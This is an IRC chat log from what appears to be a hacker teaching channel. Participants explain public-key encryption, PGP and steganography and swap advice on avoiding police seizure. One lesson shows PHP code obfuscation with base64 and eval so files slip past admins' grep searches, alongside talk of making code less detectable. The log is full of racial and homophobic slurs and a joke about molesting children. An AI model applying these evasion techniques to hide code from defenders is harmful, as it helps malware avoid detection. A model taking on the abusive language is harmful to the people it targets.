01:51 <+YmxldnB4> baWs3: quite untrue, most of them pretend to be guys
01:51 < baWs3> lmao
01:51 < S4NDALPHON> YmxldnB4: hmm, check that later, thx
01:51 <+YmxldnB4> oh she's lesbian.
01:51 < EUSIGOANONIMOUS> alguem do brasil
01:51 < S4NDALPHON> anyway, goog night anyone
01:51 < baWs3> hot chicks pretending to be haxor nerds
01:51 < Zombietrap> psh try having to get rid of one peaceChic 
01:51 <+YmxldnB4> peaceChic: you're lesbain!
01:51 < baWs3> that would be funny
01:51 <+sandstone> flulz subseven
01:51 <+YmxldnB4> lesbian*
01:51 < zeitgh0st> daemon: Do you know the concept of public-key/private-key encryption?
01:51 <+turbopinko> https://www.xkcd.com/208/
01:51 < FoxInSocks868> OK - Well, question then. I have a list of 10k MD5'd passwords in a .txt file. What would you reccomend to crack them, preferably using GPU, and on Windoze, cause I'm at work... :(
01:52 <&Fox> Goddamn
01:52 <&Fox> FoxInSocks868: Submit first to hash Repo
01:52 < Zombietrap> just google it, and DON'T DO IT AT WORK
01:52 <&Fox> then crack the rest 
01:52 <+YmxldnB4> FoxInSocks868: don't do that at work
01:52 < towq> that's not how hashes work socksfaggot
01:52 <+sandstone> daemon: you sign something by encrypting it with your private key, it can then only be decrypted by your public key, guaranteeing that whoever signed it is the owner of that public/private key pair
01:52 < towq> go read wikipedia
01:52 <+daemon> zeitgh0st not really, was reading trough many papers
01:52 < Zombietrap> goddamn all these foxes in socks
01:52 <+YmxldnB4> ok sandstone has a talk
01:52 <+sandstone> do I
01:53 <+YmxldnB4> sandstone: talk about public/private key cryptography.
01:53 < Zombietrap> fox did you give them these socks
01:53 < Anontf> !topic
01:53 <&Fox> Ok sandstone 
01:53 <&Fox> go
01:53 <&Fox> And yes
01:53 <&Fox> I provided all socks.
01:53 <+sandstone> well damn niggas
01:53 <+sandstone> so, in public/private key crypto
01:53 <+sandstone> you have, surprise surprise
01:53 <@ErrProne> SOCK FOX BEST SOCK
01:53 <+sandstone> a public and private key
01:53 <+sandstone> your public key you give out to everyone everywhurr
01:53 <+YmxldnB4> use alic and bob!
01:53 <+sandstone> private key you keep to yourself
01:53 <+YmxldnB4> alice*
01:54 <+sandstone> so if xo wants to send me a message
01:54 <+sandstone> he takes my public key, and encrypts the message with it
01:54 <+sandstone> a message encrypted with my public key can only be decrypted by my private key
01:54 <+sandstone> when I reply back to him, my message is encrypted with HIS public key
01:55 <+sandstone> and can only be decrypted with his private key
01:55 <+Am0s> now sandstone, can you explain how one goes about encrypting in this method?
01:55 <+sandstone> the whole reason public/private was made was because of some simple flaws in conventional symmetrical encryption
01:55 <+sandstone> yup, comin up on it, bit of backstory fist
01:55 <+sandstone> first*
01:55 <+YmxldnB4> Am0s: one asymmetric method is RSA
01:55 <+sandstone> with symmetrical encryption, am0s and I agree on a particular encryption key
01:56 <@garrett> Yes, hello.
01:56 <+sandstone> we need to share this with one another somehow, and prevent other people from knowing it
01:56 <+sandstone> kind of a pain, and it's hard to establish trust
01:56 <+sandstone> without a signing mechanism, I also can't tell if he really is who he says he is
01:56 <+sandstone> public/private allows for signing to prove the identity of the signer (read: who has the private key, not ALWAYS the right guy of course)
01:57 <+sandstone> and it also means I can throw my public key anywhere and everywhere, avoiding that awkward key exchange
01:57 <&Fox> OTR
01:57 <&Fox> FOREVER
01:57 <&Fox> OTR FOR EVERYTHING
01:57 <+sandstone> that nigger has it right
01:57 <+sandstone> OTR is the shit
01:57 <+sandstone> google it
01:57 <+sandstone> so for basic messages back and forth
01:57 <+sandstone> you can use plugins in mail clients, most have them
01:57 <+sandstone> or just to make it simple you can use something like gedit
01:58 <+sandstone> as an example in ubuntu (fuck you thats why)
01:58 <+sandstone> you generate a key pair, and it's then stored in your keyring
01:58 <+YmxldnB4> sandstone: it's called GPG for mail clients
01:58 <+sandstone> ^^
01:58 <+YmxldnB4> also, signing.
01:59 <+sandstone> then you get your buddies public key, add it to your keyring
01:59 <+sandstone> you type up a little something in gedit/your mail client of choice, and encrypt it with his public key
01:59 <+sandstone> you then sign the message with your private key to verify that it came from the holder of that private key
01:59 <+sandstone> your private key is the most important part
01:59 <+YmxldnB4> not only can this mechanism be used to encrypt stuff, it can also, by, for example, encrypting a hash of the message, be used to verify that a message is, in it's entirety, from the one owning the private key.
01:59 <+sandstone> you cannot ever lose it, or let anyone borrow it for a while, or anything like that
02:00 <+YmxldnB4> while still allowing anyone to see it
02:00 <+sandstone> ^^^^
02:00 <+sandstone> if the hash that is decrypted with my public key does not match the hash of the message, you know it's been manipulated
02:00 <+YmxldnB4> this is useful in e.g. mailing lists
02:00 <+sandstone> you'll often see in more nefarious corners of the internet that people will provide their public keys in their sigs, etc
02:00 <+YmxldnB4> sandstone: the sender can sign with his private key
02:01 <+sandstone> that way when you communicate it immediately starts off encrypted
02:01 <+YmxldnB4> sandstone: and then anyone can verify with his public key
02:01 <+MacGyverr> what about pgp..dont mean to interrupt
02:01 <+sandstone> pgp is an implementation of public key encryption
02:01 <+YmxldnB4> MacGyverr: we're talking about that
02:01 <+YmxldnB4> ..kindof
02:01 <+sandstone> the only one that anyone really cares about
02:01 <&Fox> PHP
02:01 <&Fox> PGP
02:01 <&Fox> BROTHERS.
02:01 <&Fox> ok
02:01 <&Fox> so
02:01 <&Fox> PGP
02:01 <+YmxldnB4> PGP/GPG is the most widely used implementation of this mechanism
02:01 <&Fox> think we got it covered
02:01 <&Fox> right?
02:01 <+sandstone> yup
02:01 <+YmxldnB4> think so
02:02 <+sandstone> questions?
02:02 < noMoreTea> so how on earth do I ever send a message that people know is from me in the first place... anonymously?
02:02 <+MacGyverr> isnt gpg opensource and pgp not
02:02 < FoxInSocks408> I really wish I got on this earlier
02:02 < peaceChic> couldn't pgp be used for one time pad types of communications, with known friends?
02:03 <&xo> oh
02:03 <&xo> BROS
02:03 <&xo> DO BROS WANNA KNOW ABOUT PGP?
02:03 < noMoreTea> in order to c ommunicate my personally identifiing fingerprint? Should I put it on my web space?
02:03 < towq> or you could just send an actual one time pad to them
02:03  * xo uses pgp on a daily basis
02:03 < towq> derp
02:03 <+sandstone> pgp is a company that implements a particular standard
02:03 <+Am0s> nomoretea, if i understand you correctly what you ask is impossible. I cannot be both anonymous and completely known. they just are opposites
02:03 <&xo> FIREGPG
02:03 < peaceChic> @noMoreTea that's the painful part, it's not easy to authenticate yourself without prior agreement, unless you use the keyring idea
02:03 <+YmxldnB4> PGP and similar products follow the OpenPGP standard (RFC 4880) for encrypting and decrypting data.
02:03 <&xo> thers a github w/ patches for firefox 4 + 5
02:03 <+Am0s> xo teahc us the magic that is pgp! pleeeease?
02:03 <&xo> YUS
02:03 <&xo> I WILL TEACH U
02:03 <&xo> GATHER ROUND
02:03 <&xo> GATHER ROUND
02:03 <+YmxldnB4> xo: read back
02:03 <+sandstone> peaceChic: otp's require a shared collection of keys
02:03 <&Fox> GATHER ROUND ONE AND ALL
02:03 <&xo> ONLY THE LITTLE ONES
02:03 <&xo> IM GOING TO MOLEST ONE OF U AFTER
02:03 <&xo> IF YOURE REALLY EXTRA GOOD
02:04 <&xo> now
02:04 <+sandstone> peaceChic: it can be used to help exchange that info though
02:04 <+Am0s> pick me!!!
02:04 <&xo> who knows
02:04 <&xo> what
02:04 <&xo> asymmetric encryption is?
02:04 <+sandstone> wtf is encryption
02:04 <+YmxldnB4> paranoiL: it's not anonymous, but it can be bound to one identity
02:04 <+MacGyverr> single sided
02:04 <+YmxldnB4> and it does not have to be your real one

02:05 <&Fox> Xo
02:05 <&xo> ok?
02:05 <&Fox> ANSWER THIS ONE
02:05 <&Fox> OK
02:05 <&Fox> BUT ANSWER THIS ONE
02:05 <&Fox> :D
02:05 <&xo> WTF
02:05  * Fox jumps up and down
02:05 <&xo> OK
02:05 <&xo> YmxldnB4: continue
02:05 <&xo> fucking this dog
02:05 <&xo> YmxldnB4: keep goin while i take care of this whiney ass dog
02:05 <+YmxldnB4> xo: using public and private keys
02:05 <+YmxldnB4> xo: where the encrypting password
02:05 <+YmxldnB4> xo: is different than the decrypting password
02:05 <&xo> FKIN DOG STOLE THE TREAT
02:06 <&xo> ive been outsmarted
02:06 <+YmxldnB4> public/private keys!
02:06 <&xo> ok
02:06 <&xo> thats sorta
02:06 <&xo> an awkward way to say it
02:06 <&xo> so ill clarify
02:06 <&xo> basically w/
02:06 <&xo> symmetric encryption
02:06 <&xo> you have a single key
02:06 <&xo> to encrypt
02:06 <&xo> and decrypt your message
02:06 <&xo> which is bad, if you wanna send your friend an email, because you have to give him the key
02:07 <&xo> and sending the key, which you can use to decrypt hte messages to him
02:07 <&xo> allows attackers to steal it
02:07 <&xo> and decrypt the messages
02:07 <&xo> if youre doing something simple
02:07 <&xo> you can just do a pre-shared symmetric key
02:07 <&xo> whatever
02:07 <&xo> give it to him on a fkn usb drive
02:07 <+sandstone> the key can be stolen during the exchange, and if either one of you lose it at either point there is no forward secrecy, and no way to verify identity
02:07 <&xo> ^
02:07 <&xo> so
02:07 <&xo> what asymmetric encryption is
02:07 <&xo> is you have 2 keys
02:07 <&xo> one key to encrypt
02:07 <&xo> one to decrypt
02:07 <&xo> the key you use to encrypt a message
02:08 <&xo> is called your PUBLIC KEY
02:08 <+YmxldnB4> (do I still get a less shitty prize than the previous one?)
02:08 <&xo> the key you use to decrypt a message encrypted with the public key is called a PRIVATE KEY
02:08 <&xo> so
02:08 <&xo> you can give your friend
02:08 <&xo> or anyone
02:08 <&xo> your public key
02:08 <&xo> and they can encrypt messages to u
02:08 <&xo> but not decrypt them
02:08 <&xo> thus why its public
02:08 <&xo> this is how GPG works
02:08 <&xo> GPG does
02:08 <+YmxldnB4> and RSA
02:08 <&xo> symmetrically encrypt
02:08 <&xo> your priv8 key
02:08 <&xo> so if its stolen, there is a passphrase required
02:08 <&xo> however
02:09 <&xo> its a lot easier to break the encryption on your key
02:09 <&xo> then it is to break an encrypted message
02:09 <&xo> KEEP YOUR KEY SAFE
02:09 <&xo> so
02:09 <&xo> practical shit
02:09 <&xo> I WANNA USE GPG HOW DO I DO THAT?
02:09 <&xo> i like FireGPG because it works w/ webmail
02:09 <&xo> its kinda buggy, but u learn to work around it
02:09 <&xo> theres also GPA
02:09 <&xo> gnu privacy assistant
02:09 <&xo> pretty simple GTK gui
02:09 <+YmxldnB4> SSL uses asymmetric encryption at first, to negotiate a symmetric password
02:09 <+YmxldnB4> then it uses symmetric encryption
02:09 <&xo> so you set it up
02:09 <+YmxldnB4> because that is faster.
02:09 <&xo> generate your key pair
02:09 <&xo> you get a public key
02:09 <&Fox> Sec
02:09 <&Fox> xo
02:10 <&Fox> sec
02:10 <&xo> if youre doin naughty things
02:10 <&Fox> XO
02:10 <&Fox> SECOND
02:10 <&Fox> GODDAMNIT
02:10 <&xo> DONT SUBMIT IT TO A KEY POOL
02:10 <&xo> ok
02:10 <&Fox> so...
02:10 <&Fox> To all the people
02:10 <@ErrProne> cryptsetup go
02:10 <&Fox> And BackTrace Security
02:10 <&Fox> That are watching this
02:10 <&Fox> I TOLD YOU NIGGA

02:11 <+turbopinko> but having respect? that feels even better
02:11 <&Fox> k.
02:11 <&Fox> Please continue
02:12 <&xo> O
02:12 <&xo> SO
02:12 <&xo> BEFORE I AS
02:12 <&xo> WAS
02:12 <&xo> RUDELY INTERRUPTED
02:12 <&xo> i was saying
02:12 <&xo> if youre using pgp to conduct clandestine dealings
02:12 <&xo> dont submit to a keyserver
02:12 <&xo> export your key
02:12 <&xo> paste it to people
02:12 <&xo> set your email to autorespond w/ it
02:12 <@ErrProne> transport solely by sneakernet
02:12 <&xo> or autoattach it
02:12 <&xo> to emails
02:12 <&xo> ErrProne: not necessary
02:12 <&xo> :P
02:12 <@ErrProne> damn!
02:13 <&xo> i mean once youve got it all setup, and understand basically how it works
02:13 <&xo> not much to it
02:13 <&xo> probably want to cycle your key every so often
02:13 <&xo> if you have any reason to switch keys
02:13 <&xo> do it
02:13 < YmxldnB4> :(
02:13 <+turbopinko> hey guise new project #school darknet gogog
02:13 <&xo> any question?
02:13 <@ErrProne> shred the key and move on
02:13 <+sandstone> this is what a public key looks like, so you can identify it
02:14 <+sandstone> http://pastebin.com/6ERv1r1Y
02:14 < candleBoth> this is where we learn the difference between "Socialising" and "Problem Solving". If you just hacked the hell out of something important, then keep that key.
02:14 < YmxldnB4> hatter: Y U DO THAT
02:14 < YmxldnB4> hatter: that's not nice
02:14 < RaT> xo: advice on getting v&?
02:14 < An0n20042> question... I'm a total n00b. I wanna learn. Where do I start? 
02:14 < FoxInSocks408> is there a difference in security in pgp vs gp
02:14 <@ErrProne> RaT: don't
02:14 < FoxInSocks408> gpg
02:14 <+MacGyverr> most msg based pgp are managed by pgp u no
02:14 <&xo> An0n20042: check out the tuts tarball in the topic
02:14 <&xo> o wait
02:14 <+MacGyverr> so if someone want to compirmise the msg would it not be easier to just go after the server
02:14 < An0n20042> k
02:14 <&xo> not in the topic
02:14 < RaT> ErrProne: of course!
02:14 <&xo> wtf
02:14 <&xo> fox
02:14 <@hatter> YmxldnB4: you were interrupting
02:14 <&xo> whats the link
02:14 <&xo> for the tuts?
02:14 <+daemon> xo, what is with creating keys... 
02:14 < Xeross> I'm also a prime example on how not to stay anonymous xD
02:14 <&Fox> Topic
02:14 <&xo> daemon: can u be more specifics
02:14 < peaceChic> @xo that was a pretty decent explanation of PKI kudos.  @noMoreTea if you know your friend pretty well, you can send your encrypted message and then give them a call or note to clue them in on the pw
02:15 <&xo> specific*
02:15 < YmxldnB4> hatter: read back
02:15 < YmxldnB4> hatter: also, fox was not?
02:15 <&xo> its just a matter of choosing the key size + encryption
02:15 <@hatter> YmxldnB4: i don't have the power to -a fox, as a lowly +o
02:15 < peaceChic> noone mentioned steganography
02:15 < RaT> xo: all i was saying is that just using encryption isn't enough.  You need to be diligent on protecting your private key, particularly in the case of v&
02:15 <&Fox> what did hatter do?
02:15 <&Fox> I'm lost
02:15 <+daemon> xo, can you describe the way you create pgp keys
02:15 <&xo> RaT: this is true
02:15 < towq> i lyke salt on my eggs
02:15 < YmxldnB4> Fox: he -v d me
02:15 <@hatter> i took YmxldnB4's voice away for interrupting
02:15 <&xo> daemon: gpg --gen-keys i think
02:15 <&xo> is the command
02:15 <&Fox> Hatter = Fox
02:15 <@hatter> right before you interrupted Fox 
02:15 <&xo> u dont wanna use the cli tho
02:15 <&xo> tbh
02:15 <+daemon> xo ok
02:16 <@hatter> i would've -v'd you too
02:16 <&xo> any decent ui
02:16 < YmxldnB4> xo: I was interrupting?
02:16 <&xo> for gpg
02:16 <@hatter> lol
02:16 <&xo> will do it
02:16 <&xo> theres no advantage to using gpg directly
02:16 <&xo> its just a huge hassle
02:16 < RaT> peaceChic: I like physical steganography, like putting an sd card inside of a shoe
02:16 <@m4tr1c3s> hey hatter
02:16 <&xo> in most cases
02:16 <&xo> again i recommend firegpg
02:16 <&xo> wont work on new FF, but if u google u can find the patches
02:16 < peaceChic> for example on keywords @noMoreTea, if I got a file from you from an email like noMoreTea, I might guess Palin was the pw
02:16 <&xo> to make it work
02:16 <&xo> thers a github repo
02:16 <&Fox> HATTER HAS BEEN SUMMONED
02:16 <&Fox> WE MUST CHANT
02:16 <&xo> YmxldnB4: idk?
02:16 <&Fox> HATTER
02:16 <&Fox> HATTER
02:16 <&Fox> HATTER
02:16 < YmxldnB4> I don't like him anymore
02:16 <&Fox> HATTER
02:16 <&Fox> HATTER
02:16 <&Fox> HATTER
02:16 < Anti-trust> when the next lesson in academy ?
02:16 <&Fox> HATTER
02:16 <&Fox> CHANT HATTER
02:16 <&Fox> OR PM HATTER
02:17 < towq> prob turned highlights off
02:17 < RaT> xo: i like the teaching, was just trying to add to it that precautions shoudl always be made in case of a bust
02:17 <+turbopinko> HATTER
02:17 <+turbopinko> HATTER
02:17 < YmxldnB4> hatter: xo promised me permantent +v :D
02:17 <&Fox> UNTIL HE SAYS HE WILL TALK

02:17 <&Fox> HATTER
02:17 <&xo> i mean like i said
02:17 <&Fox> PM ME
02:17 < noMoreTea> peaceChic: then i would have to guess you were Australian or Ubik
02:17 <&Fox> HATTER
02:17 < FoxInSocks408> why would they bust
02:17 < Anti-trust> what is hatter ?
02:17 <&xo> priv8 keys are symmetrically encrypted
02:17 <&Fox> HATTER
02:17 < Kiwi> penis
02:17 < RaT> xo: i've been v& before and had my shit on my xbox, but i guess they take xboxes now
02:17 <&Fox> HATTER
02:17 <&xo> not foolproof tho
02:17 <&Fox> HATTER
02:17 < YmxldnB4> Fox: turbopinko: STFU
02:17 <&Fox> HATTER
02:17 <&xo> RaT: they take EVERYTHING
02:17 <&xo> Lol
02:17 <&Fox> HATTER
02:17 <+turbopinko> HATTER
02:17 <&xo> theyll take ur fkin gameboyt
02:17 <&Fox> HATTER
02:17 <&Fox> HATTER
02:17 < YmxldnB4> Fox: I was gonna donate, now I'm not
02:17 < RaT> xo: not always, but i think now they generally take everything electronic
02:17 < YmxldnB4> Fox: good job
02:17 <&Fox> GODDAMNIT
02:17 < RaT> xo: this was like 7 years ago
02:17 <&Fox> HATTER
02:17 <+turbopinko> HATTER
02:18 <&Fox> jfc.
02:18 <+RaT> xo: they're not going to take your clothes, but they will look through them
02:18 <&xo> RaT: yeah thats whyat i meant
02:18 <&xo> well i meant electronics
02:18 <&xo> lol
02:18 <+sandstone> heres what you do
02:18 < MrWonderful> HATTER
02:18 <+sandstone> you bury it
02:18 <+sandstone> and you put a landmine over it
02:18 < FoxInSocks408> brilliant!
02:18 <+sandstone> and then an incendiary grenade between the box you bury it in and the landmine
02:18 < YmxldnB4> hatter: xo says I was not interrupting, now give me back my +v
02:18 < Kiwi> boobey traps just add charges
02:18 <+sandstone> srsly, keep it simple, it's just safer
02:18 <+daemon> or just make a IED and blew everything up
02:18 < Kiwi> ~nless they work~
02:18 < FoxInSocks408> what is +v
02:18 < Anti-trust> when the next lesson for school?
02:19 <@ErrProne> when in doubt
02:19 < towq> It just works.
02:19 <@ErrProne> hide a message in your imgur photos
02:19 <@ErrProne> and post for all to find
02:19 <+YmxldnB4> hatter: thank you, now we can all be happy and enjoy this channel :D
02:19 < towq> power whores will be power whores for it is irc
02:19 <+YmxldnB4> FoxInSocks408: it means you can talk when they set +m
02:19 <&Fox> Sup
02:20 <+Am0s> can somebody explain common methods for stenography?
02:20 <&Fox> Kiwi: 
02:20 < towq> modify the header of an image
02:20 <&Fox> More rainbow text please
02:20 < towq> that's it
02:20 <&Fox> that will lure out hatter
02:20 < FoxInSocks408> ummm what is +m. I'm new to all of this
02:20 <@ErrProne> steganography is only limited by the imagination
02:20 < MrWonderful> queer bait?
02:20 < AnonimoiL> xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
02:20 <+YmxldnB4> FoxInSocks408: +m is what they set so only +v +o and +a can talk
02:20 <@ErrProne> hiding shit in metadata, headers, excess bytes, etc etc
02:20 < Kiwi> how will that work
02:21 < towq> open an image in GIMP
02:21 < towq> add a header
02:21 < AnonimoiL> to much to tell if you dont havea nything to say
02:21 < FoxInSocks408> I take it these are settings for something?
02:21 < peaceChic> THanks for the reminder that the Microwave is more than a kitchen tool :)
02:21 <@ErrProne> there are algorithms that will strategically place info in locations in certain filetypes
02:21 <+YmxldnB4> FoxInSocks408: channel modes
02:21 <@ErrProne> ie mp3stego
02:21 < FoxInSocks805> that is simple?
02:21 <&Fox> Hatter 
02:21 <&Fox> cannot
02:21 < FoxInSocks856> where is refref?
02:21 <&Fox> resist rb.pl
02:21 <+YmxldnB4> Fox: hatter prolly has you on ignore
02:21 < AnonGato> what's rb.pl?
02:21 < FoxInSocks408> ooo thanks
02:21 < AnonimoiL> just as nickers are much more than just for covering things up
02:21 < peaceChic> Who the heck said something bad about cli?
02:22 <+YmxldnB4> AnonGato: rainbow script
02:22 < Shaggy> someone tell me why seamen water get's foamy when you shake it up?
02:22 < Anti-trust> THanks for the reminder that the Microwave is more than a kitchen tool
02:22 < Anti-trust> hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
02:22 <+YmxldnB4> hatter: please talk and make then shut up
02:22 < Laurelai> sup bitches

[03:02.56] <hatter> According to Jen ( FreeSabu ), anyone hosting a website for a friend is culpable for their friends activities... And teaching anything potentially dangerous makes it illegal.  Its illegal to teach self defense shooting because its the same as teaching murder.  Its illegal to teach penetration testing because its the same thing as illegally compromising a remote system.
[03:02.57] <RaT> Fox: why do you think i'm in your irc :-P

[03:18.00] <YmxldnB4> NUUU
[03:18.11] <Backslash> Is hatter back yet?
[03:18.15] <Am0s> hatter talk about what?
[03:18.20] <YmxldnB4> Also, the game
[03:18.33] <Am0s> gtfo
[03:19.10] <YmxldnB4> Yay I made 50 people lose the game
[03:19.42] <m4tr1c3s> why 50...?
[03:20.01] <Cookiie> im gonna go guys, see you
[03:20.06] <Am0s> for 12 hours teaching, we havent covered much....
[03:20.11] <Backslash> bye cookiie <3
[03:20.15] <baWs3> 2
[03:20.33] <YmxldnB4> Theres 250 in channel, 1/5 probably playing the game
[03:20.42] <FSB> what game?
[03:20.43] <m4tr1c3s> why?
[03:20.53] <xo> RaT: see what?
[03:20.56] <YmxldnB4> Anons

[03:23.12] <m4tr1c3s> If one more person asks that...
[03:23.14] <Terminal> DEFCON 19  :  http://cc.st/27d8c6   (enjoy - I believe its complete)
[03:23.22] <Am0s> lets see... about 3 hours listening to a guy blab about phreaking without ever actually explaining phreaking much... i think we touched site exploitation, metasploit was pretty well done... a cooking lesson from Fox that left me hungry... how to avoid the v& and trrying to decide which of us is the most paranoid, what to do when the feds declare ww3 against you... what else?
[03:23.29] <YmxldnB4> How to be an asshat?
[03:23.36] <sandstone> fuck you am0s

[03:26.19] <Fox> :D
[03:26.22] <Fox> sec
[03:26.23] <xk001> <3 xD
[03:26.30] <Fox> going to go make a call
[03:26.41] <Laurelai> call jen
[03:26.42] <Backslash> Let's share the love
[03:26.46] <Laurelai> ask for battletoads
[03:26.49] <Backslash> lol
[03:26.49] <hatter> ok
[03:26.51] <hatter> cigs have arrived
[03:26.54] <xk001> gonna roll a blunt in honour os us
[03:26.58] <YmxldnB4> How do you expect new to win with this crappy keyboard
[03:27.12] <Backslash> It's all yours hatter
[03:27.20] <hatter> ok
[03:27.27] <hatter> So I thought about a few topics to cover.
[03:27.35] <m4tr1c3s> hey hatter
[03:27.42] <hatter> I thought that perhaps code obfuscation
[03:27.51] <hatter> and some anti-heuristics/anti-debug
[03:27.54] <hatter> would be good
[03:28.50] <Laurelai> cool
[03:29.35] <hatter> because thus far I don't believe we've actually had a class on that
[03:29.39] <hatter> So
[03:29.43] <hatter> Code obfuscation applies to any language
[03:29.44] <hatter> Or, can apply to any language.
[03:29.45] <hatter> Well obfuscated code is usually encrypted as well as compressed
[03:29.47] <hatter> and has its own loading algorithms to decompress/decrypt before execution
[03:29.50] <hatter> I'm gonna put out some php as an example for theory,
[03:29.51] <hatter> however this snippet at the beginning is only going to be theory
[03:29.56] <hatter> as we move on the code will get more intricate
[03:30.08] <hatter> n then I'll throw some out of order code execution stuff on the end
[03:30.24] <hatter> for you machine coders & assembly coders out there
[03:30.36] <hatter> So,
[03:30.55] <hatter> This isn't going to obfuscate much
[03:30.57] <hatter> and is easily reversed
[03:31.11] <hatter> but it might hide from something like grep
[03:31.16] <hatter> where you search for files containing
[03:31.22] <hatter> in this case,
[03:31.30] <hatter> suppose i obfuscated a config file "config.php"
[03:31.50] <hatter> just so if any funny business with someone ran find -name config\* -exec grep -i password '{}' \;
[03:31.58] <hatter> were to occur,
[03:32.04] <hatter> my config file won't show up in the list
[03:33.05] <hatter> <?php $user     = "foo"; $password = "bar"; echo "Configuration loaded.";
[03:33.05] <hatter> ?>
[03:33.07] <hatter> ok
[03:33.13] <hatter> Idk why its doing that all on one line
[03:33.16] <hatter> <?php
[03:33.20] <hatter>    $user     = "foo";
[03:33.23] <hatter>    $password = "bar";
[03:33.26] <hatter>    echo "Configuration loaded.";
[03:33.28] <hatter> ?>
[03:33.34] <hatter> That'll be what we obfuscate
[03:34.42] <hatter> when we use
[03:34.46] <hatter> base64_encode
[03:34.51] <hatter> to encrypt just the code (without the tags)
[03:34.54] <hatter> we get
[03:34.55] <hatter> ICAgJHVzZXIgICAgID0gImZvbyI7CiAgICRwYXNzd29yZCA9ICJiYXIiOwogICBlY2hvICJDb25maWd1cmF0aW9uIGxvYWRlZC4iOwo=
[03:35.38] <hatter> so
[03:35.41] <hatter> we can actually
[03:35.42] <hatter> load our config
[03:35.43] <hatter> with
[03:35.54] <hatter> <?php
[03:35.54] <hatter> eval(base64_decode('ICAgJHVzZXIgICAgID0gImZvbyI7CiAgICRwYXNzd29yZCA9ICJiYXIiOwogICBlY2hvICJDb25maWd1cmF0aW9uIGxvYWRlZC4iOwo='));
[03:35.57] <hatter> ?>
[03:36.09] <hatter> if you execute that code, you'll still see it say
[03:36.15] <hatter> "Configuration loaded".
[03:36.33] <hatter> now obviously
[03:36.39] <hatter> That there isn't going to protect you
[03:36.40] <hatter> from anyone who can just
[03:36.46] <hatter> echo base64_decode()
[03:37.00] <hatter> so
[03:37.05] <hatter> How can we trap this
[03:37.10] <hatter> to only work on the box its installed on
[03:37.28] <hatter> etc
[03:37.33] <hatter> so that if someone were to obtain a copy of the code
[03:37.40] <hatter> they'd be unable to just echo out the base64?
[03:37.51] <hatter> There are multiple solutions.  This is where encryption comes into play.
[03:38.04] <hatter> php comes with a library called mcrypt
[03:38.17] <hatter> mcrypt supports most of the encryption algorithms out there
[03:38.40] <hatter> so
[03:38.45] <hatter> lets walk through using php
[03:38.48] <hatter> to encrypt some data
[03:38.52] <hatter> then we'll walk through getting our key
[03:38.58] <hatter> etc
[03:39.06] <hatter> before re-obfuscating the code further.
[03:39.40] <hatter> So
[03:39.48] <hatter> When you're using mcrypt for encrypting/decrypting data
[03:39.55] <hatter> a few things are important
[03:39.55] <hatter> one is your iv size
[03:40.00] <RaT> http://i.imgur.com/bQWCF.jpg
[03:40.03] <hatter> another is your iv itself
[03:40.51] <hatter> then there's the algorithm
[03:41.03] <hatter> your algorithm can determine a bit
[03:41.06] <hatter> including keysize
[03:41.13] <hatter> if you use the wrong keysize with your algorithm
[03:41.17] <hatter> it may not encrypt and decrypt properly
[03:41.22] <hatter> so that's important as well
[03:41.29] <hatter> if you have any confusion
[03:41.34] <hatter> about the ciphers you can use
[03:41.36] <hatter> for mcrypt
[03:41.37] <hatter> you can
[03:41.53] <hatter> print_r(mcrypt_list_algorithms());
[03:42.47] <hatter> when I run this
[03:42.53] <hatter> it returns the following:
[03:42.58] <hatter> Array
[03:42.58] <hatter> ( [0] => cast-128 [1] => gost [2] => rijndael-128 [3] => twofish [4] => arcfour [5] => cast-256 [6] => loki97 [7] => rijndael-192 [8] => saferplus [9] => wake [10] => blowfish-compat [11] => des [12] => rijndael-256 [13] => serpent [14] => xtea [15] => blowfish [16] => enigma [17] => rc2 [18] => tripledes
[03:43.03] <hatter> )
[03:43.10] <Backslash> Reference: http://php.net/manual/en/book.mcrypt.php
[03:43.31] <hatter> ^
[03:44.03] <hatter> Now when you refer to these algorithms
[03:44.07] <hatter> there's a large amount of constants
[03:44.11] <hatter> and they're all prefixed by MCRYPT_
[03:44.40] <xo> protip
[03:44.43] <xo> beer is delicious
[03:44.56] <raine> ew
[03:45.26] <hatter> sec, hacking up a script to make sure this works (I'll pastebin the code)
[03:47.02] <hatter> Yep
[03:47.06] <hatter> So for our example
[03:47.24] <hatter> we'll take that base64 that we've encoded
[03:47.54] <hatter> and encrypt it
[03:47.58] <xo> heh ive been workin on modifying the mcrypt tripledes code, hatter :3
[03:48.10] <hatter> yeah i had to do that before for that licensin thing remember
[03:48.14] <xo> mcrypt is a nice lib. is very compact for what it does
[03:48.37] <hatter> yeah
[03:48.37] <xo> oh idk
[03:48.43] <hatter> so neway
[03:48.43] <xo> im just hackin it up to make it less detectable
[03:48.45] <xo> moar poly
[03:48.47] <xo> n all that
[03:49.15] <hatter> this code
[03:49.16] <RaT> xo: why tripledes?
[03:49.20] <hatter> will echo out
[03:49.24] <hatter> encrypted code
[03:49.26] <hatter> well,
[03:49.28] <xo> RaT: cuz it doesnt matter and it was simple
[03:49.31] <hatter> the encryption of the base64
[03:49.38] <hatter> the key is just "testkey" for now
[03:49.43] <hatter> we'll get to re-defining the key
[03:49.43] <xo> my purpose isnt security, but obsfuscation
[03:49.46] <hatter> http://pastebin.com/LyQah5QY
[03:49.46] <xo> if u follow
[03:50.09] <hatter> if you execute that, you'll get a bunch of binary moonspeak
[03:50.16] <RaT> xo: ya i see what you're saying
[03:50.20] <hatter> so
[03:50.22] <hatter> you might
[03:50.26] <hatter> php encoder.php > encrypted.code
[03:50.43] <hatter> you now have a file called encrypted.code
[03:50.46] <xo> i mean, what ive done to tripledes is undoubtedly incredibly inscure, but thats not the point
[03:50.54] <hatter> full of encrypted base64
[03:50.57] <hatter> encrypted with blowfish
[03:51.00] <xo> not that it was secure to begin w/
[03:51.05] <hatter> wel
[03:51.06] <xo> it was jus teasy to modify for my purposes
[03:51.06] <hatter> wait
[03:51.10] <hatter> take a couple of those echos out
[03:51.15] <hatter> I'll post up another one
[03:51.55] <hatter> http://pastebin.com/2BART219
[03:52.28] <hatter> execute that code > encrypted.code
[03:52.33] <hatter> and you'll now have a textfile
[03:53.18] <hatter> of binary shit
[03:53.20] <hatter> its not really a text file
[03:53.21] <hatter> but w/e
[03:54.07] <hatter> now
[03:54.10] <hatter> you'll need this same code
[03:54.13] <xo> i think kayla is inbound
[03:54.14] <hatter> in your encryption
[03:54.16] <hatter> for your decryption
[03:54.17] <Laurelai> yup
[03:54.20] <xo> :D
[03:54.21] <xo> <3 kayla
[03:54.36] <hatter> so, that said, we can keep the first two lines
[03:57.04] <hatter> http://pastebin.com/WUiwK1fG
